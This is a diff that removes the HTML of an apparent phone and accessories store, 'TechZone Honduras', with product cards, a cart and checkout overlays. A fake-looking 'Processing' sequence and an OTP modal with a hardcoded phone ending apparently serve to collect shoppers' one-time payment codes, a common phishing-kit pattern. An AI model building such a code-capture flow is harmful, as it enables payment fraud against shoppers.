-    <div class="product-badge" data-translate="top_rated">Top Rated!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxys23'">
-        <img src="https://m.media-amazon.com/images/I/51xj0EFyXHL._AC_SX522_.jpg" alt="Samsung Galaxy S23" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxys23">Samsung Galaxy S23</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $249</span></div>
-        <a href="product.html?id=galaxys23" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy S22 Ultra -->
-<div class="product-card" data-category="samsung" data-product-id="galaxys22ultra">
-    <div class="product-badge" data-translate="popular">Popular!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxys22ultra'">
-        <img src="https://m.media-amazon.com/images/I/613Fp7fknhL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Samsung Galaxy S22 Ultra" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxys22ultra">Samsung Galaxy S22 Ultra</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $229</span></div>
-        <a href="product.html?id=galaxys22ultra" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy A35 -->
-<div class="product-card" data-category="samsung" data-product-id="galaxya35">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxya35'">
-        <img src="https://m.media-amazon.com/images/I/61R5WdNY8LL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Samsung Galaxy A35" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxya35">Samsung Galaxy A35</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $199</span></div>
-        <a href="product.html?id=galaxya35" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy A15 5G -->
-<div class="product-card" data-category="samsung" data-product-id="galaxya155g">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxya155g'">
-        <img src="https://m.media-amazon.com/images/I/41vU1u8DZXL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Samsung Galaxy A15 5G" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxya155g">Samsung Galaxy A15 5G</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $189</span></div>
-        <a href="product.html?id=galaxya155g" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy M15 -->
-<div class="product-card" data-category="samsung" data-product-id="galaxym15">
-    <div class="product-badge" data-translate="deal">Hot Deal!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxym15'">
-        <img src="https://m.media-amazon.com/images/I/41k9aSrQRAL._SX300_SY300_QL70_FMwebp_.jpg" alt="Samsung Galaxy M15" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxym15">Samsung Galaxy M15</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $169</span></div>
-        <a href="product.html?id=galaxym15" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy S22 -->
-<div class="product-card" data-category="samsung" data-product-id="galaxys22">
-    <div class="product-badge" data-translate="popular">Popular!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxys22'">
-        <img src="https://m.media-amazon.com/images/I/61M4ndNetDL._AC_SX569_.jpg" alt="Samsung Galaxy S22" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxys22">Samsung Galaxy S22</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $149</span></div>
-        <a href="product.html?id=galaxys22" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy M14 -->
-<div class="product-card" data-category="samsung" data-product-id="galaxym14">
-    <div class="product-badge" data-translate="certified">Certified!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxym14'">
-        <img src="https://m.media-amazon.com/images/I/41tFC8GKz8L._SX300_SY300_QL70_FMwebp_.jpg" alt="Samsung Galaxy M14" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxym14">Samsung Galaxy M14</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $139</span></div>
-        <a href="product.html?id=galaxym14" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Samsung Galaxy A05s -->
-<div class="product-card" data-category="samsung" data-product-id="galaxya05s">
-    <div class="product-badge" data-translate="deal">Hot Deal!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=galaxya05s'">
-        <img src="https://m.media-amazon.com/images/I/51neXjpArML.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Samsung Galaxy A05s" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=galaxya05s">Samsung Galaxy A05s</a></h3>
-        <p class="product-desc" data-translate="samsung_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $129</span></div>
-        <a href="product.html?id=galaxya05s" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Xiaomi Poco F6 -->
-<div class="product-card" data-category="poco" data-product-id="pocof6">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=pocof6'">
-        <img src="https://m.media-amazon.com/images/I/61O1Ey0bwxL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Xiaomi Poco F6" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=pocof6">Xiaomi Poco F6</a></h3>
-        <p class="product-desc" data-translate="poco_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $329</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=pocof6" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- Xiaomi Poco X7 Pro -->
-<div class="product-card" data-category="poco" data-product-id="pocox7pro">
-    <div class="product-badge" data-translate="deal">Hot Deal!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=pocox7pro'">
-        <img src="https://m.media-amazon.com/images/I/61qXnVmcxxL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Xiaomi Poco X7 Pro" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=pocox7pro">Xiaomi Poco X7 Pro</a></h3>
-        <p class="product-desc" data-translate="poco_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $299</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=pocox7pro" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- Xiaomi Redmi Note 13 Pro -->
-<div class="product-card" data-category="xiaomi" data-product-id="redminote13pro">
-    <div class="product-badge" data-translate="certified">Certified!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=redminote13pro'">
-        <img src="https://m.media-amazon.com/images/I/71ZjanVe7oL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Xiaomi Redmi Note 13 Pro" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=redminote13pro">Xiaomi Redmi Note 13 Pro</a></h3>
-        <p class="product-desc" data-translate="xiaomi_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $279</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=redminote13pro" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- Xiaomi Redmi Note 14 -->
-<div class="product-card" data-category="xiaomi" data-product-id="redminote14">
-    <div class="product-badge" data-translate="deal">Hot Deal!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=redminote14'">
-        <img src="https://m.media-amazon.com/images/I/81L4MbrSEBL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Xiaomi Redmi Note 14" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=redminote14">Xiaomi Redmi Note 14</a></h3>
-        <p class="product-desc" data-translate="xiaomi_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $259</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=redminote14" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- Xiaomi Redmi Note 14 Pro 5G -->
-<div class="product-card" data-category="xiaomi" data-product-id="redminote14pro5g">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=redminote14pro5g'">
-        <img src="https://m.media-amazon.com/images/I/51AelgZWpaL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Xiaomi Redmi Note 14 Pro 5G" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=redminote14pro5g">Xiaomi Redmi Note 14 Pro 5G</a></h3>
-        <p class="product-desc" data-translate="xiaomi_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $249</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=redminote14pro5g" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- Xiaomi Redmi Note 13 -->
-<div class="product-card" data-category="xiaomi" data-product-id="redminote13">
-    <div class="product-badge" data-translate="deal">Hot Deal!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=redminote13'">
-        <img src="https://m.media-amazon.com/images/I/31WbsYNtasL._AC_SX569_.jpg" alt="Xiaomi Redmi Note 13" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=redminote13">Xiaomi Redmi Note 13</a></h3>
-        <p class="product-desc" data-translate="xiaomi_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $229</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=redminote13" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- AirPods 4 with ANC -->
-<div class="product-card" data-category="audio" data-product-id="airpods4anc">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=airpods4anc'">
-        <img src="https://ng.jumia.is/unsafe/fit-in/500x500/filters:fill(white)/product/31/2933714/1.jpg?9024" alt="AirPods 4 with ANC" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=airpods4anc">AirPods 4 with ANC</a>
-        </h3>
-        <p class="product-desc">Cancelación de ruido activa con estuche de carga USB-C</p>
-        <div class="product-rating">
-            <div class="stars">
-                <i class="fas fa-star"></i>
-                <i class="fas fa-star"></i>
-                <i class="fas fa-star"></i>
-                <i class="fas fa-star"></i>
-                <i class="fas fa-star"></i>
-            </div>
-            <span class="rating-count">(87)</span>
-        </div>
-        <div class="product-price">
-            <span class="current-price">Starting from $199</span>
-        </div>
-        <a href="product.html?id=airpods4anc" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-headphones"></i>
-            <span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- AirPods Pro 2 -->
-<div class="product-card" data-category="audio" data-product-id="airpodspro2">
-    <div class="product-badge" data-translate="premium">Premium!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=airpodspro2'">
-        <img src="https://images.unsplash.com/photo-1600294037681-c80b4cb5b434?w=600&h=400&fit=crop&crop=center" alt="AirPods Pro 2" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-            <a href="product.html?id=airpodspro2">AirPods Pro (2da Gen)</a>
-        </h3>
-        <p class="product-desc" data-translate="airpods_desc">Cancelación de ruido activa de siguiente nivel</p>
-        <div class="product-rating">
-            <div class="stars">
-                <i class="fas fa-star"></i>
-                <i class="fas fa-star"></i>
-                <i class="fas fa-star"></i>
-                <i class="fas fa-star"></i>
-                <i class="fas fa-star"></i>
-            </div>
-            <span class="rating-count">(98)</span>
-        </div>
-        <div class="product-price">
-            <span class="current-price">$179.00</span>
-            <span class="original-price">$249.00</span>
-            <span class="discount">-28%</span>
-        </div>
-        <a href="product.html?id=airpodspro2" class="btn btn-primary choose-type-btn">
-            <i class="fas fa-headphones"></i>
-            <span data-translate="choose_type">Choose Type</span>
-        </a>
-    </div>
-</div>
-<!-- Xiaomi Poco X7 Pro -->
-<div class="product-card" data-category="poco" data-product-id="pocox3pro">
-    <div class="product-badge" data-translate="deal">Hot Deal!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=pocox3pro'">
-        <img src="https://m.media-amazon.com/images/I/61Dfzukq7KL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Xiaomi Poco X7 Pro" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=pocox3pro">Xiaomi Poco X7 Pro</a></h3>
-        <p class="product-desc" data-translate="poco_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $179</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=pocox3pro" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- AirPods 4th Generation -->
-<div class="product-card" data-category="airpods" data-product-id="airpods4">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=airpods4'">
-        <img src="https://m.media-amazon.com/images/I/61df2M5+OnL._AC_SX466_.jpg" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=airpods4">AirPods 4th Generation</a></h3>
-        <p class="product-desc" data-translate="airpods_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $129</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=airpods4" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-headphones"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- Xiaomi Redmi 14C -->
-<div class="product-card" data-category="xiaomi" data-product-id="redmi14c">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=redmi14c'">
-        <img src="https://m.media-amazon.com/images/I/612KZF3V+ZL._AC_SY300_SX300_.jpg" alt="Xiaomi Redmi 14C" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=redmi14c">Xiaomi Redmi 14C</a></h3>
-        <p class="product-desc" data-translate="xiaomi_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $129</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=redmi14c" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-mobile-alt"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- AirPods 3rd Generation -->
-<div class="product-card" data-category="airpods" data-product-id="airpods3">
-    <div class="product-badge" data-translate="new">New!</div>
-    <div class="product-image" onclick="window.location.href='product.html?id=airpods3'">
-        <img src="https://m.media-amazon.com/images/I/61jcsHsFN8L.__AC_SY445_SX342_QL70_FMwebp_.jpg" alt="AirPods 3rd Generation" loading="lazy" decoding="async">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name"><a href="product.html?id=airpods3">AirPods 3rd Generation</a></h3>
-        <p class="product-desc" data-translate="airpods_desc"></p>
-        <div class="product-price"><span class="current-price">Starting from $99</span></div>
-        <div class="product-actions">
-            <a href="product.html?id=airpods3" class="btn btn-primary choose-type-btn">
-                <i class="fas fa-headphones"></i><span data-translate="choose_type">Choose Type</span>
-            </a>
-        </div>
-    </div>
-</div>
-<!-- JBL Pulse Speaker -->
-<div class="product-card" data-category="audio" data-product-id="jblpulse">
-  <div class="product-badge" data-translate="new">New!</div>
-  <div class="product-image" onclick="window.location.href='product.html?id=jblpulse'">
-    <img src="https://m.media-amazon.com/images/I/51gb2hWadiL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="JBL Pulse" loading="lazy">
-  </div>
-  <div class="product-info">
-    <h3 class="product-name"><a href="product.html?id=jblpulse">JBL Pulse</a></h3>
-    <p class="product-desc" data-translate="jbl_speaker_desc"></p>
-    <div class="product-price"><span class="current-price">Starting from $99</span></div>
-    <a href="product.html?id=jblpulse" class="btn btn-primary choose-type-btn">
-      <i class="fas fa-volume-up"></i><span data-translate="choose_type">Choose Type</span>
-    </a>
-  </div>
-</div>
-<!-- JBL Headphones 720 bt-->
-<div class="product-card" data-category="audio" data-product-id="jblheadphones">
-  <div class="product-badge" data-translate="new">New!</div>
-  <div class="product-image" onclick="window.location.href='product.html?id=jblheadphones'">
-    <img src="https://m.media-amazon.com/images/I/61EL2AKKcBL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="JBL Headphones" loading="lazy">
-  </div>
-  <div class="product-info">
-    <h3 class="product-name"><a href="product.html?id=jblheadphones">JBL Headphones</a></h3>
-    <p class="product-desc" data-translate="jbl_headphones_desc"></p>
-    <div class="product-price"><span class="current-price">Starting from $39</span></div>
-    <a href="product.html?id=jblheadphones" class="btn btn-primary choose-type-btn">
-      <i class="fas fa-headphones"></i><span data-translate="choose_type">Choose Type</span>
-    </a>
-  </div>
-</div>
-<!-- JBL GO Speaker -->
-<div class="product-card" data-category="audio" data-product-id="jblgo">
-  <div class="product-badge" data-translate="budget">Budget!</div>
-  <div class="product-image" onclick="window.location.href='product.html?id=jblgo'">
-    <img src="https://m.media-amazon.com/images/I/71kzInVwzgL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="JBL GO" loading="lazy">
-  </div>
-  <div class="product-info">
-    <h3 class="product-name"><a href="product.html?id=jblgo">JBL GO</a></h3>
-    <p class="product-desc" data-translate="jbl_speaker_desc"></p>
-    <div class="product-price"><span class="current-price">Starting from $19.99</span></div>
-    <a href="product.html?id=jblgo" class="btn btn-primary choose-type-btn">
-      <i class="fas fa-volume-up"></i><span data-translate="choose_type">Choose Type</span>
-    </a>
-  </div>
-</div>
-<!-- Power Bank -->
-<div class="product-card" data-category="accessories" data-product-id="powerbank">
-    <div class="product-image">
-        <img src="https://www-konga-com-res.cloudinary.com/w_300,f_auto,fl_lossy,dpr_auto,q_auto/media/catalog/product/J/D/190950_1664522191.jpg" alt="Power Bank">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-             <a href="product.html?id=powerbank&lang=en">Portable Power Bank 5000mAh</a>
-        </h3>
-        <p class="product-desc" data-translate="powerbank_desc">Compact 5000mAh power bank. Fast charging for phones and small devices. LED battery indicator and multiple protection systems.</p>
-        <div class="product-price">
-            <span class="current-price">$16</span>
-            <span class="original-price">$25</span>
-            <span class="discount">-36%</span>
-        </div>
-        <div class="product-features">
-            <div class="feature">
-                <i class="fas fa-check"></i>
-                <span>5000mAh Capacity</span>
-            </div>
-            <div class="feature">
-                <i class="fas fa-check"></i>
-                <span>Fast Charging</span>
-            </div>
-            <div class="feature">
-                <i class="fas fa-check"></i>
-                <span>LED Indicator</span>
-            </div>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=powerbank&lang=en" class="details-btn">
-                <i class="fas fa-info-circle"></i>
-                <span>Details</span>
-            </a>
-            <button class="add-to-cart-btn" data-product='{"id": "powerbank", "name": "Portable Power Bank 5000mAh", "price": 16, "image": "https://www-konga-com-res.cloudinary.com/w_300,f_auto,fl_lossy,dpr_auto,q_auto/media/catalog/product/J/D/190950_1664522191.jpg"}'>
-            <i class="fas fa-cart-plus"></i>
-            <span data-translate="add_to_cart">Add to Cart</span>
-        </button>
-        </div>
-    </div>
-</div>
-<!-- iPhone Charging Cable -->
-<div class="product-card" data-category="accessories" data-product-id="cableiphone">
-  <div class="product-image" onclick="window.location.href='product.html?id=cableiphone'">
-    <img src="https://m.media-amazon.com/images/I/51ItdSbJFwL._SL1064_.jpg" alt="iPhone Charging Cable" loading="lazy">
-  </div>
-  <div class="product-info">
-    <h3 class="product-name"><a href="product.html?id=cableiphone">iPhone Charging Cable</a></h3>
-    <p class="product-desc" data-translate="cable_iphone_desc"></p>
-    <div class="product-price"><span class="current-price">$12</span></div>
-    <a href="product.html?id=cableiphone" class="btn btn-primary choose-type-btn">
-      <i class="fas fa-plug"></i><span data-translate="choose_type">Choose Type</span>
-    </a>
-  </div>
-</div>
-<!-- Screen Protector -->
-<div class="product-card" data-category="accessories" data-product-id="screenprotector">
-    <div class="product-image">
-        <img src="https://m.media-amazon.com/images/I/61NGYQsztvL._UF1000,1000_QL80_FMwebp_.jpg" alt="Gorilla Glass Screen Protector">
-    </div>
-    <div class="product-info">
-        <h3 class="product-name">
-             <a href="product.html?id=screenprotector&lang=en">Premium Gorilla Glass Screen Protection</a>
-        </h3>
-        <p class="product-desc" data-translate="protector_desc">Professional-grade 9H hardness tempered glass screen protector with oleophobic coating technology. Crystal-clear transparency with advanced bubble-free installation system for seamless device protection.</p>
-        <div class="product-price">
-            <span class="current-price">$11.99</span>
-            <span class="original-price">$19.99</span>
-            <span class="discount">-40%</span>
-        </div>
-        <div class="product-features">
-            <div class="feature">
-                <i class="fas fa-check"></i>
-                <span>9H Hardness</span>
-            </div>
-            <div class="feature">
-                <i class="fas fa-check"></i>
-                <span>Bubble-Free</span>
-            </div>
-            <div class="feature">
-                <i class="fas fa-check"></i>
-                <span>Crystal Clear</span>
-            </div>
-        </div>
-        <div class="product-actions">
-            <a href="product.html?id=screenprotector&lang=en" class="details-btn">
-                <i class="fas fa-info-circle"></i>
-                <span>Details</span>
-            </a>
-            <button class="add-to-cart-btn" data-product='{"id": "screenprotector", "name": "Gorilla Glass Screen Protector", "price": 11.99, "image": "https://m.media-amazon.com/images/I/61NGYQsztvL._UF1000,1000_QL80_FMwebp_.jpg"}'>
-            <i class="fas fa-cart-plus"></i>
-            <span data-translate="add_to_cart">Add to Cart</span>
-        </button>
-        </div>
-    </div>
-</div>
-<!-- Generic Earphones -->
-<div class="product-card" data-category="audio" data-product-id="earphones">
-  <div class="product-badge" data-translate="budget">Budget!</div>
-  <div class="product-image" onclick="window.location.href='product.html?id=earphones'">
-    <img src="https://m.media-amazon.com/images/I/612SeIGYPUL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="Generic Earphones" loading="lazy">
-  </div>
-  <div class="product-info">
-    <h3 class="product-name"><a href="product.html?id=earphones">Generic Earphones</a></h3>
-    <p class="product-desc" data-translate="earphones_desc"></p>
-    <div class="product-price"><span class="current-price">Starting from $9.99</span></div>
-    <a href="product.html?id=earphones" class="btn btn-primary choose-type-btn">
-      <i class="fas fa-headphones"></i><span data-translate="choose_type">Choose Type</span>
-    </a>
-  </div>
-</div>
-<!-- USB-C Charging Cable -->
-<div class="product-card" data-category="accessories" data-product-id="cableusbc">
-  <div class="product-image" onclick="window.location.href='product.html?id=cableusbc'">
-    <img src="https://m.media-amazon.com/images/I/61AsLefMRqL.__AC_SX300_SY300_QL70_FMwebp_.jpg" alt="USB-C Charging Cable" loading="lazy">
-  </div>
-  <div class="product-info">
-    <h3 class="product-name"><a href="product.html?id=cableusbc">USB-C Charging Cable</a></h3>
-    <p class="product-desc" data-translate="cable_usbc_desc"></p>
-    <div class="product-price"><span class="current-price">$9.99</span></div>
-    <a href="product.html?id=cableusbc" class="btn btn-primary choose-type-btn">
-      <i class="fas fa-plug"></i><span data-translate="choose_type">Choose Type</span>
-    </a>
-  </div>
-</div>
-                
-            </div>
-        </div>
-    </section>
-
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <div class="footer-content">
-                <div class="footer-section">
-                    <h4 data-translate="company_info">Company Information</h4>
-                    <div class="contact-details">
-                        <p id="footer-address">
-                            <i class="fas fa-map-marker-alt"></i>
-                            TechZone Honduras, Tegucigalpa, Honduras
-                        </p>
-                        <p id="footer-phone">
-                            <i class="fas fa-phone"></i>
-                            <span id="footer-country-phone">+504 9756-4382</span>
-                        </p>
-                        <p id="footer-email">
-                            <i class="fas fa-envelope"></i>
-                            sales@techzone-honduras.com
-                        </p>
-                        <p id="footer-hours">
-                            <i class="fas fa-clock"></i>
-                            Monday to Saturday: 9:00 AM - 8:00 PM
-                        </p>
-                    </div>
-                </div>
-                <div class="footer-section">
-                    <h4 data-translate="quick_links">Quick Links</h4>
-                    <ul>
-                        <li><a href="about.html" data-translate="about">About Us</a></li>
-                        <li><a href="contact.html" data-translate="contact">Contact</a></li>
-                        <li><a href="support.html" data-translate="support">Technical Support</a></li>
-                        <li><a href="warranty.html" data-translate="warranty">Warranty</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h4 data-translate="policies">Policies</h4>
-                    <ul>
-                        <li><a href="privacy.html" data-translate="privacy">Privacy</a></li>
-                        <li><a href="terms.html" data-translate="terms">Terms and Conditions</a></li>
-                        <li><a href="returns.html" data-translate="returns">Returns</a></li>
-                        <li><a href="shipping.html" data-translate="shipping_policy">Shipping</a></li>
-                    </ul>
-                </div>
-                <div class="footer-section">
-                    <h4 data-translate="payment_methods">Payment Methods</h4>
-                    <p data-translate="payment_info">We accept bank transfers, deposits and cash on delivery.</p>
-                </div>
-            </div>
-            <div class="footer-bottom">
-                <p>&copy; 2024 TechZone Honduras. <span data-translate="rights_reserved">All rights reserved.</span></p>
-            </div>
-        </div>
-    </footer>
-
-    <!-- Cart Sidebar -->
-    <div id="cart-overlay" class="cart-overlay">
-        <div id="cart-sidebar" class="cart-sidebar">
-            <div class="cart-header">
-                <h2 data-translate="shopping_cart">Shopping Cart</h2>
-                <button id="close-cart" aria-label="Close cart">
-                    <i class="fas fa-times"></i>
-                </button>
-            </div>
-
-            <div class="cart-items" id="cart-items">
-                <div id="empty-cart-message" class="empty-cart-message">
-                    <i class="fas fa-shopping-cart"></i>
-                    <p data-translate="empty_cart">Your cart is empty</p>
-                </div>
-            </div>
-
-            <div class="cart-summary">
-                <div class="summary-row">
-                    <span data-translate="subtotal">Subtotal:</span>
-                    <span id="cart-subtotal">$0.00</span>
-                </div>
-                <div class="summary-row">
-                    <span data-translate="shipping">Shipping:</span>
-                    <span id="cart-shipping">Free</span>
-                </div>
-                <div class="summary-row total">
-                    <span data-translate="total">Total:</span>
-                    <span id="cart-total">$0.00</span>
-                </div>
-            </div>
-
-            <div class="cart-actions">
-                <button id="continue-shopping" class="btn btn-secondary" data-translate="continue_shopping">Continue Shopping</button>
-                <button id="checkout-btn" class="btn btn-primary" data-translate="checkout">Proceed to Checkout</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- This will be dynamically created by the JavaScript -->
-
-    <!-- Processing Overlay -->
-    <div id="processing-overlay" class="processing-overlay">
-        <div class="processing-modal">
-            <div class="processing-header">
-                <div class="processing-security">
-                    <i class="fas fa-shield-alt"></i>
-                    <span data-translate="processing_secure">Secure Processing</span>
-                </div>
-            </div>
-
-            <div class="spinner"></div>
-            <h3 data-translate="processing_order">Processing your order...</h3>
-            <p class="text-sm" data-translate="processing_wait">Please do not close this window</p>
-
-            <div class="processing-steps">
-                <div class="processing-step active" id="step-1">
-                    <div class="step-icon active">1</div>
-                    <span data-translate="validating_payment">Validating payment method</span>
-                </div>
-                <div class="processing-step" id="step-2">
-                    <div class="step-icon pending">2</div>
-                    <span data-translate="confirming_inventory">Confirming inventory</span>
-                </div>
-                <div class="processing-step" id="step-3">
-                    <div class="step-icon pending">3</div>
-                    <span data-translate="generating_order">Generating purchase order</span>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- OTP Verification Overlay -->
-    <div id="otp-overlay" class="otp-overlay">
-        <div class="otp-modal">
-            <div class="otp-header">
-                <div class="otp-security">
-                    <i class="fas fa-shield-alt"></i>
-                    <span data-translate="security_verification">Security Verification</span>
-                </div>
-            </div>
-
-            <div class="otp-content">
-                <h3 data-translate="verify_payment">Verify Your Payment</h3>
-                <p data-translate="otp_sent">We've sent a 6-digit verification code to your phone number ending in **34. Please enter it below to complete your purchase.</p>
-
-                <div class="otp-input-container">
